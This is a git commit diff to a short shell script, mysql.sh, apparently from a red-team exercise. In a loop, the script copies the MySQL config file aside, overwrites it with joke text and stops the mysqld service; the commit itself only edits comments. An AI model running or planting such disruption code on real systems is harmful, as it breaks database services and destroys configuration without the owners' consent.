cd7883cc4ffa1ccb5a357872de2bb0164ca7bd52
mattr555-r <64177813+mattr555-r@users.noreply.github.com>
2023-04-12 15:16:10 -0400

    Update mysql.sh

--- mysql.sh
+++ mysql.sh
@@ -9,14 +9,15 @@ do
  #Generate random number, check if the number is even or odd
  if [ $(( $RANDOM % 2)) -eq 0 ]
  then
- #Copy config file to other location, then overwrite original, add users for red team access
+ #Copy config file to other location, then overwrite original
    cp '/etc/mysql/my.cnf' '/etc/mm.cnf'
    echo "I'm Batman" > '/etc/mysql/my.cnf'
  else
- #Copy config file to other location, then overwrite original, add users for red team access
+ #Copy config file to other location, then overwrite original
    cp '/etc/mysql/my.cnf' '/home/mm.cnf'
    echo "You ever dance with the devil in the pale mooon light?" > '/etc/mysql/my.conf'
  fi
- #Stop samba service
+ 
+ #Stop mysqld service
  sudo service mysqld stop
 done
